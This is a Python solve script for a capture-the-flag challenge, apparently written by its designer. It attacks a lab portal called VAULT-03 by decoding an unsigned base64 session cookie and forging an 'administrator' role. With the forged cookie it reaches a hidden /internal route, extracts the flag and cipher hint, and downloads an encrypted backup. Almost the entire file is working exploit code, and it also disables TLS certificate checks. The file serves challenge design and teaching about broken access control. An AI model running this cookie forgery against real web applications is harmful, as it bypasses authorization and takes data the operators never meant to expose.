#!/usr/bin/env python3
"""
RaidTheRoot (RTR) - Stage 3 exploit
Owner: Member 2 (Challenge Design A)

Self-developed proof-of-concept against the VAULT-03 portal. Walks the full
intended path end to end:

  1. request the portal and capture the issued session cookie
  2. decode it and read the role the server handed out
  3. confirm the unlinked route rejects a viewer session
  4. forge an administrator session and re-request
  5. recover the flag, the cipher hint and the staged file

The vulnerability: the portal puts the user's role in the session cookie as
plain base64 with no signature, then trusts it on the server. Anything the
client sends back is believed. OWASP A01:2021 Broken Access Control.

Usage:
    python3 solve.py                              # default target
    python3 solve.py https://vault-03.rtr.local   # explicit target
"""

import base64
import json
import sys

try:
    import requests
except ImportError:
    sys.exit("pip install requests")

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET = sys.argv[1] if len(sys.argv) > 1 else "https://vault-03.rtr.local"
COOKIE = "nxb_session"


def step(n, text):
    print(f"\n[{n}] {text}")
    print("    " + "-" * 62)


def decode_cookie(raw):
    return json.loads(base64.b64decode(raw).decode())


def encode_cookie(obj):
    return base64.b64encode(json.dumps(obj).encode()).decode()


def main():
    s = requests.Session()
    s.verify = False          # self-signed certificate on the lab proxy

    # --- 1. pick up a session -----------------------------------------
    step(1, f"requesting {TARGET}/ to obtain a session")
    r = s.get(f"{TARGET}/", timeout=10)
    print(f"    HTTP {r.status_code}")

    raw = s.cookies.get(COOKIE)
    if not raw:
        sys.exit("    no session cookie issued - is the portal up?")
    print(f"    {COOKIE}={raw}")

    # --- 2. decode it --------------------------------------------------
    step(2, "decoding the session cookie")
    session = decode_cookie(raw)
    print(f"    {json.dumps(session)}")
    print(f"\n    The role is client-side data. No signature, no MAC.")
    print(f"    current role: {session.get('role')}")

    # --- 3. probe the unlinked route -----------------------------------
    step(3, "requesting /internal with the issued viewer session")
    r = s.get(f"{TARGET}/internal", timeout=10)
    print(f"    HTTP {r.status_code}")
    try:
        body = r.json()
        print(f"    {json.dumps(body, indent=6)}")
        print(f"\n    The rejection names the role it wants: "
              f"{body.get('required_role')}")
    except ValueError:
        print(f"    {r.text[:200]}")

    # --- 4. forge the role ---------------------------------------------
    step(4, "forging an administrator session")
    session["role"] = "administrator"
    forged = encode_cookie(session)
    print(f"    {json.dumps(session)}")
    print(f"    {COOKIE}={forged}")

    # Drop the issued cookie first - otherwise the jar keeps both and the
    # server-set one (which carries an explicit path) wins.
    s.cookies.clear()
    s.cookies.set(COOKIE, forged, path="/")

    r = s.get(f"{TARGET}/internal", timeout=10)
    print(f"\n    HTTP {r.status_code}")

    if r.status_code != 200:
        sys.exit("    bypass failed")

    # --- 5. collect the loot -------------------------------------------
    step(5, "extracting results")

    hint = r.headers.get("X-Cipher-Hint")
    print(f"    X-Cipher-Hint: {hint}   <- Stage 4 needs this")

    flag = None
    for line in r.text.splitlines():
        if "RTR{" in line:
            flag = line.strip().split("RTR{")[1].split("}")[0]
            flag = "RTR{" + flag + "}"
            break
    print(f"    flag: {flag}")

    r = s.get(f"{TARGET}/internal/download/vault_backup.enc", timeout=10)
    if r.status_code == 200:
        with open("vault_backup.enc", "wb") as fh:
            fh.write(r.content)
        print(f"    saved vault_backup.enc ({len(r.content)} bytes)")
    else:
        print(f"    download failed: HTTP {r.status_code}")

    print(f"\n{'=' * 66}")
    print("  Stage 3 complete.")
    print(f"  Submit: {flag}")
    print(f"  Carry forward: vault_backup.enc + cipher family '{hint}'")
    print(f"{'=' * 66}\n")


if __name__ == "__main__":
    main()
